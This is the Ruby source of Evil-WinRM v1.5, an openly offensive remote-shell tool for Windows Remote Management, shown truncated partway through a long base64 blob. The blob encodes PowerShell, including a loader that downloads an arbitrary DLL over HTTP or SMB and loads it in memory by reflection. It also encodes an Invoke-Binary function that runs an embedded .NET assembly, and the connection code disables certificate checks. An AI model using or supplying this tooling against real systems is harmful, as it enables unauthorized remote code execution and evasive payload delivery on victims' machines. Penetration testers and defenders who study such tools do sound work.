#!/usr/bin/ruby
# -*- encoding : utf-8 -*-
# Author: CyberVaca
# Twitter: https://twitter.com/CyberVaca_
# Based on the Alamot's original code

# Dependencies
require 'winrm'
require 'winrm-fs'
require 'base64'
require 'readline'
require 'stringio'
require 'colorize'

require 'optionparser'
require 'io/console'

# Constants
TYPE_INFO = 0
TYPE_ERROR = 1
TYPE_WARNING = 2
TYPE_DATA = 3
VERSION = '1.5'

# Global vars
# Available commands
$LIST = ['upload', 'download', 'exit', 'menu', 'services'].sort
$LISTASSEM = [''].sort
# Set this to false to disable colors
$colors_enabled = true
# Set the path for your scripts (ps1 files) and your executables (exe files)
$scripts_path = ""
$executables_path = ""
# Connection vars initialization, set your ip-address/hostname, port, username and password
$host = ""
$port = "5985"
$user = ""
$password = ""


# Class creation
class EvilWinRM
    def arguments()
        options = {port:"5985"}
        optparse = OptionParser.new do |opts|
            opts.banner = "Usage: evil-winrm -i IP -u USER -s SCRIPTS_PATH -e EXES_PATH"
            opts.on("-i", "--ip IP", "Remote host IP or hostname (required)") { |val| options[:ip] = val }
            opts.on("-P", "--port PORT",  "Remote host port (default 5985)") { |val| options[:port] = val }
            opts.on("-u", "--user USER",  "Username (required)") { |val| options[:user] = val}
            opts.on("-p", "--password PASS",  "Password") { |val| options[:password] = val}
            opts.on("-s", "--scripts SCRIPTS_PATH",  "Powershell scripts path (required)") { |val| options[:scripts] = val}
            opts.on("-e", "--executables EXE_PATH",  "C# executables path (required)") { |val| options[:executables] = val}
            opts.on('-h', '--help', 'Display this screen') do
                puts opts
                exit
            end
        end

        begin
            optparse.parse!
            mandatory = [:ip, :user, :scripts, :executables]      
            missing = mandatory.select{ |param| options[param].nil? }
            unless missing.empty?
                raise OptionParser::MissingArgument.new(missing.join(', '))
            end
        rescue OptionParser::InvalidOption, OptionParser::MissingArgument
            puts $!.to_s
            puts optparse
            exit
        end

        $host = options[:ip]
        $user = options[:user]
        if options[:password] == nil
            options[:password] = STDIN.getpass(prompt='Enter Password: ')
        end
        $password = options[:password]
        $port = options[:port]
        $scripts_path = options[:scripts]
        $executables_path = options[:executables]
    end

    def connection_initialization()
        # Connection parameters
        $conn = WinRM::Connection.new(
            endpoint: "http://" + $host + ":" + $port + "/wsman",
            user: $user,
            password: $password,
            :no_ssl_peer_verification => true,
            # Below, config for SSL, uncomment if needed and set cert files
            # transport: :ssl,
            # client_cert: 'certnew.cer',
            # client_key: 'client.key',
        )
    end

    # Define colors
    def colorize(text, color = "default")
        colors = {"default" => "38", "blue" => "34", "red" => "31", "yellow" => "1;33", "magenta" => "35"}
        color_code = colors[color]
        return "\033[0;#{color_code}m#{text}\033[0m"
    end

    # Messsage printing
    def print_message(msg, msg_type)
        if msg_type == TYPE_INFO then
            msg_prefix = "Info: "
            color = "blue"
        elsif msg_type == TYPE_WARNING then
            msg_prefix = "Warning: "
            color = "yellow"
        elsif msg_type == TYPE_ERROR then
            msg_prefix = "Error: "
            color = "red"
        elsif msg_type == TYPE_DATA then
            msg_prefix = "Data: "
            color = 'magenta'
        else
            msg_prefix = "Error"
            color = "red"
        end

        if $colors_enabled then
            puts("#{self.colorize(msg_prefix + msg, color)}")
        else
            puts(msg_prefix + msg)
        end
        puts()
    end

    # Directories validation
    def check_directories(path, purpose)
        if path == "" then
            self.print_message("The directory used for " + purpose + " can't be empty. Please edit the script and set a path", TYPE_ERROR)
            self.custom_exit(1)
        end

        if (/cygwin|mswin|mingw|bccwin|wince|emx/ =~ RUBY_PLATFORM) != nil then
            # Windows
            if path[-1] != "\\" then
                path.concat("\\")
            end
        else
            # Unix
            if path[-1] != "/" then
                path.concat("/")
            end
        end

        if !File.directory?(path) then
            self.print_message("The directory \"" + path + "\" used for " + purpose + " was not found", TYPE_ERROR)
            self.custom_exit(1)
        end

        if purpose == "scripts" then
            $scripts_path = path
        elsif purpose == "executables" then
            $executables_path = path
        end
    end

    # Silent warnings
    def silent_warnings
        old_stderr = $stderr
        $stderr = StringIO.new
        yield
    ensure
        $stderr = old_stderr
    end

    # Read powershell script files
    def read_scripts(scripts)
        files = Dir.entries(scripts).select{ |f| File.file? File.join(scripts, f) }
        return files
    end

    # Read executable files
    def read_executables(executables)
        files = Dir.glob("#{executables}*.exe", File::FNM_DOTMATCH)
        return files
    end

    # Read local files and directories names
    def paths(directory)
        files = Dir.glob("#{directory}*.*", File::FNM_DOTMATCH)
        directories = Dir.glob("#{directory}*").select {|f| File.directory? f}
        return files + directories
    end

    # Custom exit
    def custom_exit(exit_code = 0)
        if exit_code == 0 then
            puts()
            self.print_message("Exiting with code " + exit_code.to_s, TYPE_INFO)
        elsif exit_code == 1 then
            self.print_message("Exiting with code " + exit_code.to_s, TYPE_ERROR)
        else
            self.print_message("Exiting with code " + exit_code.to_s, TYPE_ERROR)
        end
        exit(exit_code)
    end

    # Main function
    def main
        self.arguments()
        self.connection_initialization()
        file_manager = WinRM::FS::FileManager.new($conn)
        puts()
        self.print_message("Starting Evil-WinRM shell v" + VERSION, TYPE_INFO)
        self.check_directories($scripts_path, "scripts")
        self.check_directories($executables_path, "executables")
        functions = self.read_scripts($scripts_path)
        executables = self.read_executables($executables_path)
        menu = Base64.decode64("JG1lbnUgPSBAIgoKICAgX19fIF9fIF9fICBfX19fICBfICAgICAgICAgICAgICAgICAgCiAgLyAgX10gIHwgIHx8ICAgIHx8IHwgICAgICAgICAgICAgICAgIAogLyAgW198ICB8ICB8IHwgIHwgfCB8ICAgICAgICAgICAgICAgICAKfCAgICBfXSAgfCAgfCB8ICB8IHwgfF9fXyAgICAgICAgICAgICAgCnwgICBbX3wgIDogIHwgfCAgfCB8ICAgICB8ICAgICAgICAgICAgIAp8ICAgICB8XCAgIC8gIHwgIHwgfCAgICAgfCAgICAgICAgICAgICAKfF9fX19ffCBcXy8gIHxfX19ffHxfX19fX3wgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogX18gICAgX18gIF9fX18gIF9fX18gICBfX19fICAgX19fIF9fXyAKfCAgfF9ffCAgfHwgICAgfHwgICAgXCB8ICAgIFwgfCAgIHwgICB8CnwgIHwgIHwgIHwgfCAgfCB8ICBfICB8fCAgRCAgKXwgXyAgIF8gfAp8ICB8ICB8ICB8IHwgIHwgfCAgfCAgfHwgICAgLyB8ICBcXy8gIHwKfCAgYGAgICcgIHwgfCAgfCB8ICB8ICB8fCAgICBcIHwgICB8ICAgfAogXCAgICAgIC8gIHwgIHwgfCAgfCAgfHwgIC4gIFx8ICAgfCAgIHwKICBcXy9cXy8gIHxfX19ffHxfX3xfX3x8X198XF98fF9fX3xfX198CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAoKICAgICAgICAgICAgICAgICAgICAgICAgICAgQnk6IEN5YmVyVmFjYUBIYWNrUGxheWVycwoKIkAKCgppZiAoJGZ1bmNpb25lc19wcmV2aWFzLmNvdW50IC1sZSAxKSB7JGZ1bmNpb25lc19wcmV2aWFzID0gKGxzIGZ1bmN0aW9uOikuTmFtZX0KCmZ1bmN0aW9uIGwwNGQzci1Mb2FkRGxsIHsKICAgIHBhcmFtKFtzd2l0Y2hdJHNtYiwgW3N3aXRjaF0kbG9jYWwsIFtzd2l0Y2hdJGh0dHAsIFtzdHJpbmddJHBhdGgpCgogICAgJGhlbHA9QCIKLlNZTk9QU0lTCiAgICBkbGwgbG9hZGVyLgogICAgUG93ZXJTaGVsbCBGdW5jdGlvbjogbDA0ZDNyLUxvYWREbGwKICAgIEF1dGhvcjogSMOpY3RvciBkZSBBcm1hcyAoM3Y0U2kwTikKCiAgICBSZXF1aXJlZCBkZXBlbmRlbmNpZXM6IE5vbmUKICAgIE9wdGlvbmFsIGRlcGVuZGVuY2llczogTm9uZQouREVTQ1JJUFRJT04KICAgIC4KLkVYQU1QTEUKICAgIGwwNGQzci1Mb2FkRGxsIC1zbWIgLXBhdGggXFwxOTIuMTY4LjEzOS4xMzJcXHNoYXJlXFxteURsbC5kbGwKICAgIGwwNGQzci1Mb2FkRGxsIC1sb2NhbCAtcGF0aCBDOlxVc2Vyc1xQZXBpdG9cRGVza3RvcFxteURsbC5kbGwKICAgIGwwNGQzci1Mb2FkRGxsIC1odHRwIC1wYXRoIGh0dHA6Ly9leGFtcGxlLmNvbS9teURsbC5kbGwKCiAgICBEZXNjcmlwdGlvbgogICAgLS0tLS0tLS0tLS0KICAgIEZ1bmN0aW9uIHRoYXQgbG9hZCBhbiBhcmJpdHJhcnkgZGxsCiJACgogICAgaWYgKCgkc21iIC1lcSAkZmFsc2UgLWFuZCAkbG9jYWwgLWVxICRmYWxzZSAtYW5kICRodHRwIC1lcSAkZmFsc2UpIC1vciAoJHBhdGggLWVxICIiIC1vciAkcGF0aCAtZXEgJG51bGwpKQogICAgewogICAgICAgIHdyaXRlLWhvc3QgIiRoZWxwYG4iCiAgICB9CiAgICBlbHNlCiAgICB7CgogICAgICAgIGlmICgkaHR0cCkKICAgICAgICB7CiAgICAgICAgICAgIFdyaXRlLUhvc3QgIlsrXSBSZWFkaW5nIGRsbCBieSBIVFRQIgogICAgICAgICAgICAkd2ViY2xpZW50ID0gW1N5c3RlbS5OZXQuV2ViQ2xpZW50XTo6bmV3KCkKICAgICAgICAgICAgJGRsbCA9ICR3ZWJjbGllbnQuRG93bmxvYWREYXRhKCRwYXRoKQogICAgICAgIH0KICAgICAgICBlbHNlCiAgICAgICAgewogICAgICAgICAgICBpZigkc21iKXsgV3JpdGUtSG9zdCAiWytdIFJlYWRpbmcgZGxsIGJ5IFNNQiIgfQogICAgICAgICAgICBlbHNlIHsgV3JpdGUtSG9zdCAiWytdIFJlYWRpbmcgZGxsIGxvY2FsbHkiIH0KCiAgICAgICAgICAgICRkbGwgPSBbU3lzdGVtLklPLkZpbGVdOjpSZWFkQWxsQnl0ZXMoJHBhdGgpCiAgICAgICAgfQogICAgICAgIAoKICAgICAgICBpZiAoJGRsbCAtbmUgJG51bGwpCiAgICAgICAgewogICAgICAgICAgICBXcml0ZS1Ib3N0ICJbK10gTG9hZGluZyBkbGwuLi4iCiAgICAgICAgICAgICRhc3NlbWJseV9sb2FkZWQgPSBbU3lzdGVtLlJlZmxlY3Rpb24uQXNzZW1ibHldOjpMb2FkKCRkbGwpCiAgICAgICAgICAgICRvYmogPSAoKCRhc3NlbWJseV9sb2FkZWQuR2V0RXhwb3J0ZWRUeXBlcygpIHwgU2VsZWN0LU9iamVjdCBEZWNsYXJlZE1ldGhvZHMgKS5EZWNsYXJlZE1ldGhvZHMgfCBXaGVyZS1PYmplY3QgeyRfLmlzcHVibGljIC1lcSAkdHJ1ZX0gfCBTZWxlY3QtT2JqZWN0IERlY2xhcmluZ1R5cGUsbmFtZSAtVW5pcXVlIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlICkKICAgICAgICAgICAgW2FycmF5XSRtZXRob2RzID0gZm9yZWFjaCAoJGFzc2VtYmx5cHJvcGVydGllcyBpbiAkb2JqKSB7ICRuYW1lc3BhY2UgPSAkYXNzZW1ibHlwcm9wZXJ0aWVzLkRlY2xhcmluZ1R5cGUudG9zdHJpbmcoKTsgJG1ldG9kbyA9ICRhc3NlbWJseXByb3BlcnRpZXMubmFtZS50b3N0cmluZygpOyAiWyIgKyAkbmFtZXNwYWNlICsgIl0iICsgIjo6IiArICRtZXRvZG8gKyAiKCkiIH0KICAgICAgICAgICAgJG1ldGhvZHMgPSAkbWV0aG9kcyB8IFNlbGVjdC1PYmplY3QgLVVuaXF1ZSA7ICRnbG9iYWw6c2hvd21ldGhvZHMgPSAgICgkbWV0aG9kc3wgd2hlcmUgeyAkZ2xvYmFsOnNob3dtZXRob2RzICAtbm90Y29udGFpbnMgJF99KSB8IGZvcmVhY2ggeyIkX2BuIn0KICAgICAgICAgICAgCiAgICAgICAgfQogICAgfQp9CmZ1bmN0aW9uIG1lbnUgewpbYXJyYXldJGZ1bmNpb25lc19udWV2YXMgPSAobHMgZnVuY3Rpb246IHwgV2hlcmUtT2JqZWN0IHsoJF8ubmFtZSkuTGVuZ3RoIC1nZSAiNCIgLWFuZCAkXy5uYW1lIC1ub3RsaWtlICJDbGVhci1Ib3N0KiIgLWFuZCAkXy5uYW1lIC1ub3RsaWtlICJDb252ZXJ0RnJvbS1TZGRsU3RyaW5nIiAtYW5kICRfLm5hbWUgLW5vdGxpa2UgIkZvcm1hdC1IZXgiIC1hbmQgJF8ubmFtZSAtbm90bGlrZSAiR2V0LUZpbGVIYXNoKiIgLWFuZCAkXy5uYW1lIC1ub3RsaWtlICJHZXQtVmVyYioiIC1hbmQgJF8ubmFtZSAtbm90bGlrZSAiaGVscCIgLWFuZCAkXy5uYW1lIC1uZSAiSW1wb3J0LVBvd2VyU2hlbGxEYXRhRmlsZSIgLWFuZCAkXy5uYW1lIC1uZSAiSW1wb3J0U3lzdGVtTW9kdWxlcyIgLWFuZCAkXy5uYW1lIC1uZSAiTWFpbiIgLWFuZCAkXy5uYW1lIC1uZSAibWtkaXIiIC1hbmQgJF8ubmFtZSAtbmUgImNkLi4iIC1hbmQgJF8ubmFtZSAtbmUgIm1rZGlyIiAtYW5kICRfLm5hbWUgLW5lICJtb3JlIiAtYW5kICRfLm5hbWUgLW5lICJOZXctR3VpZCIgLWFuZCAkXy5uYW1lIC1uZSAiTmV3LVRlbXBvcmFyeUZpbGUiIC1hbmQgJF8ubmFtZSAtbmUgIlBhdXNlIiAtYW5kICRfLm5hbWUgLW5lICJUYWJFeHBhbnNpb24yIiAtYW5kICRfLm5hbWUgLW5lICJwcm9tcHQiIC1hbmQgJF8ubmFtZSAtbmUgIm1lbnUiIC1hbmQgJF8ubmFtZSAtbmUgImF1dG8iIC1hbmQgJF8ubmFtZSAtbmUgInNob3ctbWV0aG9kcy1sb2FkZWQiIH0gfCBzZWxlY3Qtb2JqZWN0IG5hbWUgKS5uYW1lCiRtdWVzdHJhX2Z1bmNpb25lcyA9ICgkZnVuY2lvbmVzX251ZXZhcyB8IHdoZXJlIHskZnVuY2lvbmVzX3ByZWNhcmdhZGFzIC1ub3Rjb250YWlucyAkX30pIHwgZm9yZWFjaCB7ImBuWytdICRfIn0KJG11ZXN0cmFfZnVuY2lvbmVzID0gJG11ZXN0cmFfZnVuY2lvbmVzIC1yZXBsYWNlICIgICIsIiIgCiRtZW51ID0gJG1lbnUgKyAkbXVlc3RyYV9mdW5jaW9uZXMgKyAiYG4iCiRtZW51ID0gJG1lbnUgLXJlcGxhY2UgIiBbK10iLCJbK10iCldyaXRlLUhvc3QgJG1lbnUKCn0KZnVuY3Rpb24gYXV0byB7ClthcnJheV0kZnVuY2lvbmVzX251ZXZhcyA9IChscyBmdW5jdGlvbjogfCBXaGVyZS1PYmplY3QgeygkXy5uYW1lKS5MZW5ndGggLWdlICI0IiAtYW5kICRfLm5hbWUgLW5vdGxpa2UgIkNsZWFyLUhvc3QqIiAtYW5kICRfLm5hbWUgLW5vdGxpa2UgIkNvbnZlcnRGcm9tLVNkZGxTdHJpbmciIC1hbmQgJF8ubmFtZSAtbm90bGlrZSAiRm9ybWF0LUhleCIgLWFuZCAkXy5uYW1lIC1ub3RsaWtlICJHZXQtRmlsZUhhc2gqIiAtYW5kICRfLm5hbWUgLW5vdGxpa2UgIkdldC1WZXJiKiIgLWFuZCAkXy5uYW1lIC1ub3RsaWtlICJoZWxwIiAtYW5kICRfLm5hbWUgLW5lICJJbXBvcnQtUG93ZXJTaGVsbERhdGFGaWxlIiAtYW5kICRfLm5hbWUgLW5lICJJbXBvcnRTeXN0ZW1Nb2R1bGVzIiAtYW5kICRfLm5hbWUgLW5lICJNYWluIiAtYW5kICRfLm5hbWUgLW5lICJta2RpciIgLWFuZCAkXy5uYW1lIC1uZSAiY2QuLiIgLWFuZCAkXy5uYW1lIC1uZSAibWtkaXIiIC1hbmQgJF8ubmFtZSAtbmUgIm1vcmUiIC1hbmQgJF8ubmFtZSAtbmUgIk5ldy1HdWlkIiAtYW5kICRfLm5hbWUgLW5lICJOZXctVGVtcG9yYXJ5RmlsZSIgLWFuZCAkXy5uYW1lIC1uZSAiUGF1c2UiIC1hbmQgJF8ubmFtZSAtbmUgIlRhYkV4cGFuc2lvbjIiIC1hbmQgJF8ubmFtZSAtbmUgInByb21wdCIgLWFuZCAkXy5uYW1lIC1uZSAibWVudSIgLWFuZCAkXy5uYW1lIC1uZSAic2hvdy1tZXRob2RzLWxvYWRlZCJ9IHwgc2VsZWN0LW9iamVjdCBuYW1lICkubmFtZQokbXVlc3RyYV9mdW5jaW9uZXMgPSAoJGZ1bmNpb25lc19udWV2YXMgfCB3aGVyZSB7JGZ1bmNpb25lc19wcmVjYXJnYWRhcyAtbm90Y29udGFpbnMgJF99KSB8IGZvcmVhY2ggeyIkX2BuIn0KJG11ZXN0cmFfZnVuY2lvbmVzID0gJG11ZXN0cmFfZnVuY2lvbmVzIC1yZXBsYWNlICIgICIsIiIgCiRtdWVzdHJhX2Z1bmNpb25lcwoKCn0KCmZ1bmN0aW9uIEludm9rZS1CaW5hcnkge3BhcmFtKFthcnJheV0kYXJndW1lbnRvcykKaWYgKCRhcmd1bWVudG9zIC1lcSAkbnVsbCkge2JyZWFrfQpbUmVmbGVjdGlvbi5Bc3NlbWJseV06OkxvYWQoW2J5dGVbXV1AKDc3LCA5MCwgMTQ0LCAwLCAzLCAwLCAwLCAwLCA0LCAwLCAwLCAwLCAyNTUsIDI1NSwgMCwgMCwgMTg0LCAwLCAwLCAwLCAwLCAwLCAwLCAwLCA2NCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMTI4LCAwLCAwLCAwLCAxNCwgMzEsIDE4NiwgMTQsIDAsIDE4MCwgOSwgMjA1LCAzMywgMTg0LCAxLCA3NiwgMjA1LCAzMywgODQsIDEwNCwgMTA1LCAxMTUsIDMyLCAxMTIsIDExNCwgMTExLCAxMDMsIDExNCwgOTcsIDEwOSwgMzIsIDk5LCA5NywgMTEwLCAxMTAsIDExMSwgMTE2LCAzMiwgOTgsIDEwMSwgMzIsIDExNCwgMTE3LCAxMTAsIDMyLCAxMDUsIDExMCwgMzIsIDY4LCA3OSwgODMsIDMyLCAxMDksIDExMSwgMTAwLCAxMDEsIDQ2LCAxMywgMTMsIDEwLCAzNiwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgODAsIDY5LCAwLCAwLCA3NiwgMSwgMywgMCwgMjQ1LCAxODIsIDIzMSwgOTIsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDIyNCwgMCwgMiwgMzMsIDExLCAxLCAxMSwgMCwgMCwgMTAsIDAsIDAsIDAsIDYsIDAsIDAsIDAsIDAsIDAsIDAsIDk0LCA0MSwgMCwgMCwgMCwgMzIsIDAsIDAsIDAsIDY0LCAwLCAwLCAwLCAwLCAwLCAxNiwgMCwgMzIsIDAsIDAsIDAsIDIsIDAsIDAsIDQsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDYsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDEyOCwgMCwgMCwgMCwgMiwgMCwgMCwgMCwgMCwgMCwgMCwgMywgMCwgOTYsIDEzMywgMCwgMCwgMTYsIDAsIDAsIDE2LCAwLCAwLCAwLCAwLCAxNiwgMCwgMCwgMTYsIDAsIDAsIDAsIDAsIDAsIDAsIDE2LCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAxMiwgNDEsIDAsIDAsIDc5LCAwLCAwLCAwLCAwLCA2NCwgMCwgMCwgNDAsIDMsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDk2LCAwLCAwLCAxMiwgMCwgMCwgMCwgMjEyLCAzOSwgMCwgMCwgMjgsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDMyLCAwLCAwLCA4LCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCA4LCAzMiwgMCwgMCwgNzIsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDQ2LCAxMTYsIDEwMSwgMTIwLCAxMTYsIDAsIDAsIDAsIDEwMCwgOSwgMCwgMCwgMCwgMzIsIDAsIDAsIDAsIDEwLCAwLCAwLCAwLCAyLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAzMiwgMCwgMCwgOTYsIDQ2LCAxMTQsIDExNSwgMTE0LCA5OSwgMCwgMCwgMCwgNDAsIDMsIDAsIDAsIDAsIDY0LCAwLCAwLCAwLCA0LCAwLCAwLCAwLCAxMiwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgNjQsIDAsIDAsIDY0LCA0NiwgMTE0LCAxMDEsIDEwOCwgMTExLCA5OSwgMCwgMCwgMTIsIDAsIDAsIDAsIDAsIDk2LCAwLCAwLCAwLCAyLCAwLCAwLCAwLCAxNiwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgNjQsIDAsIDAsIDY2LCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCA2NCwgNDEsIDAsIDAsIDAsIDAsIDAsIDAsIDcyLCAwLCAwLCAwLCAyLCAwLCA1LCAwLCAxOTYsIDMyLCAwLCAwLCAxNiwgNywgMCwgMCwgMSwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMTksIDQ4LCA2LCAwLCAxMDQsIDAsIDAsIDAsIDEsIDAsIDAsIDE3LCAwLCAxMTUsIDE1LCAwLCAwLCAxMCwgMTAsIDYsIDQwLCAxNiwgMCwgMCwgMTAsIDAsIDYsIDQwLCAxNywgMCwgMCwgMTAsIDAsIDIsIDIyLCAxNTQsIDExMSwgMTgsIDAsIDAsIDEwLCAxMSwgNywgNDAsIDE5LCAwLCAwLCAxMCwgMTIsIDgsIDQwLCAyMCwgMCwgMCwgMTAsIDEzLCA5LCAxMTEsIDIxLCAwLCAwLCAxMCwgMTksIDQsIDE3LCA0LCAyMCwgMjMsIDE0MSwgMSwgMCwgMCwgMSwgMTksIDcsIDE3LCA3LCAyMiwgMiwgMjMsIDQwLCAxLCAwLCAwLCA0MywgNDAsIDIsIDAsIDAsIDQzLCAxNjIsIDE3LCA3LCAxMTEsIDI0LCAwLCAwLCAxMCwgMzgsIDYsIDExMSwgMTgsIDAsIDAsIDEwLCAxOSwgNSwgMTcsIDUsIDE5LCA2LCA0MywgMCwgMTcsIDYsIDQyLCA2NiwgODMsIDc0LCA2NiwgMSwgMCwgMSwgMCwgMCwgMCwgMCwgMCwgMTIsIDAsIDAsIDAsIDExOCwgNTIsIDQ2LCA0OCwgNDYsIDUxLCA0OCwgNTEsIDQ5LCA1NywgMCwgMCwgMCwgMCwgNSwgMCwgMTA4LCAwLCAwLCAwLCA1NiwgMiwgMCwgMCwgMzUsIDEyNiwgMCwgMCwgMTY0LCAyLCAwLCAwLCA2OCwgMywgMCwgMCwgMzUsIDgzLCAxMTYsIDExNCwgMTA1LCAxMTAsIDEwMywgMTE1LCAwLCAwLCAwLCAwLCAyMzIsIDUsIDAsIDAsIDgsIDAsIDAsIDAsIDM1LCA4NSwgODMsIDAsIDI0MCwgNSwgMCwgMCwgMTYsIDAsIDAsIDAsIDM1LCA3MSwgODUsIDczLCA2OCwgMCwgMCwgMCwgMCwgNiwgMCwgMCwgMTYsIDEsIDAsIDAsIDM1LCA2NiwgMTA4LCAxMTEsIDk4LCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAyLCAwLCAwLCAxLCA3MSwgMjEsIDIsIDAsIDksIDgsIDAsIDAsIDAsIDI1MCwgMzcsIDUxLCAwLCAyMiwgMCwgMCwgMSwgMCwgMCwgMCwgMjUsIDAsIDAsIDAsIDIsIDAsIDAsIDAsIDEsIDAsIDAsIDAsIDEsIDAsIDAsIDAsIDI0LCAwLCAwLCAwLCAxMiwgMCwgMCwgMCwgMSwgMCwgMCwgMCwgMSwgMCwgMCwgMCwgMiwgMCwgMCwgMCwgMiwgMCwgMCwgMCwgMCwgMCwgMTAsIDAsIDEsIDAsIDAsIDAsIDAsIDAsIDYsIDAsIDU1LCAwLCA0OCwgMCwgNiwgMCwgMTAxLCAwLCA3NSwgMCwgNiwgMCwgMTUwLCAwLCAxMzIsIDAsIDYsIDAsIDE3MywgMCwgMTMyLCAwLCA2LCAwLCAyMDIsIDAsIDEzMiwgMCwgNiwgMCwgMjMzLCAwLCAxMzIsIDAsIDYsIDAsIDIsIDEsIDEzMiwgMCwgNiwgMCwgMjcsIDEsIDEzMiwgMCwgNiwgMCwgNTQsIDEsIDEzMiwgMCwgNiwgMCwgODEsIDEsIDEzMiwgMCwgNiwgMCwgMTM3LCAxLCAxMDYsIDEsIDYsIDAsIDE1NywgMSwgMTMyLCAwLCA2LCAwLCAyMDEsIDEsIDE4MiwgMSwgNTUsIDAsIDIyMSwgMSwgMCwgMCwgNiwgMCwgMTIsIDIsIDIzNiwgMSwgNiwgMCwgNDQsIDIsIDIzNiwgMSwgNiwgMCwgOTIsIDIsIDgyLCAyLCA2LCAwLCAxMDUsIDIsIDQ4LCAwLCA2LCAwLCAxMTMsIDIsIDgyLCAyLCA2LCAwLCAxNDksIDIsIDQ4LCAwLCA2LCAwLCAxNzQsIDIsIDEzMiwgMCwgNiwgMCwgMTg4LCAyLCAxMzIsIDAsIDEwLCAwLCAyMzgsIDIsIDIyNiwgMiwgNiwgMCwgMjAsIDMsIDI0OSwgMiwgNiwgMCwgNDcsIDMsIDEzMiwgMCwgMCwgMCwgMCwgMCwgMSwgMCwgMCwgMCwgMCwgMCwgMSwgMCwgMSwgMCwgMTI5LCAxLCAxNiwgMCwgMjIsIDAsIDMxLCAwLCA1LCAwLCAxLCAwLCAxLCAwLCA4MCwgMzIsIDAsIDAsIDAsIDAsIDE1MCwgMCwgNjIsIDAsIDEwLCAwLCAxLCAwLCAwLCAwLCAxLCAwLCA3MCwgMCwgMTcsIDAsIDEyNiwgMCwgMTYsIDAsIDI1LCAwLCAxMjYsIDAsIDE2LCAwLCAzMywgMCwgMTI2LCAwLCAxNiwgMCwgNDEsIDAsIDEyNiwgMCwgMTYsIDAsIDQ5LCAwLCAxMjYsIDAsIDE2LCAwLCA1NywgMCwgMTI2LCAwLCAxNiwgMCwgNjUsIDAsIDEyNiwgMCwgMTYsIDAsIDczLCAwLCAxMjYsIDAsIDE2LCAwLCA4MSwgMCwgMTI2LCAwLCAxNiwgMCwgODksIDAsIDEyNiwgMCwgMjEsIDAsIDk3LCAwLCAxMjYsIDAsIDE2LCAwLCAxMDUsIDAsIDEyNiwgMCwgMjYsIDAsIDEyMSwgMCwgMTI2LCAwLCAzMiwgMCwgMTI5LCAwLCAxMjYsIDAsIDM3LCAwLCAxMzcsIDAsIDEyNiwgMCwgMzcsIDAsIDE0NSwgMCwgMTI0LCAyLCA0MSwgMCwgMTQ1LCAwLCAxMzEsIDIsIDQxLCAwLCA5LCAwLCAxNDAsIDIsIDQ3LCAwLCAxNjEsIDAsIDE1NywgMiwgNTEsIDAsIDE2OSwgMCwgMTgzLCAyLCA1NywgMCwgMTY5LCAwLCAxOTksIDIsIDY0LCAwLCAxODUsIDAsIDM0LCAzLCA2OSwgMCwgMTg1LCAwLCAzOSwgMywgOTAsIDAsIDIwMSwgMCwgNTgsIDMsIDEwMywgMCwgNDYsIDAsIDExLCAwLCAxMjYsIDAsIDQ2LCAwLCAxOSwgMCwgMTgyLCAwLCA0NiwgMCwgMjcsIDAsIDE5NSwgMCwgNDYsIDAsIDM1LCAwLCAxOTUsIDAsIDQ2LCAwLCA0MywgMCwgMTk1LCAwLCA0NiwgMCwgNTEsIDAsIDE4MiwgMCwgNDYsIDAsIDU5LCAwLCAyMDEsIDAsIDQ2LCAwLCA2NywgMCwgMTk1LCAwLCA0NiwgMCwgODMsIDAsIDE5NSwgMCwgNDYsIDAsIDk5LCAwLCAyMjEsIDAsIDQ2LCAwLCAxMDcsIDAsIDIzMCwgMCwgNDYsIDAsIDExNSwgMCwgMjM5LCAwLCAxMTAsIDAsIDQsIDEyOCwgMCwgMCwgMSwgMCwgMCwgMCwgMTcxLCAyNywgMTMwLCA3MiwgMCwgMCwgMCwgMCwgMCwgMCwgNzQsIDIsIDAsIDAsIDQsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDEsIDAsIDM5LCAwLCAwLCAwLCAwLCAwLCA0LCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAxLCAwLCAyMTQsIDIsIDAsIDAsIDAsIDAsIDQ1LCAwLCA4NiwgMCwgNDcsIDAsIDg2LCAwLCAwLCAw